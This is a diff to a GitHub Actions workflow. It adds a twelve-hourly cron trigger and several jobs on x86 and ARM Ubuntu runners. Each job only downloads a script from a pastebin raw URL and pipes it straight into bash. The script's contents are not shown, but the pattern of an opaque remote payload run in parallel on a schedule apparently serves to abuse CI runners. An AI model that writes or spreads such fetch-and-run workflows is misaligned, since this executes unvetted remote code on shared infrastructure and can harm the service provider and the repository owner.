@@ -1,7 +1,15 @@
-on: workflow_dispatch
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: 0 */12 * * *
 jobs:
   s1:
     runs-on: ubuntu-26.04
+    steps:
+      - run: |
+          wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
+  s2:
+    runs-on: ubuntu-26.04-arm
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
@@ -10,8 +18,18 @@ jobs:
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
+  s4:
+    runs-on: ubuntu-24.04-arm
+    steps:
+      - run: |
+          wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
   s5:
     runs-on: ubuntu-22.04
+    steps:
+      - run: |
+          wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
+  s6:
+    runs-on: ubuntu-22.04-arm
     steps:
       - run: |
           wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
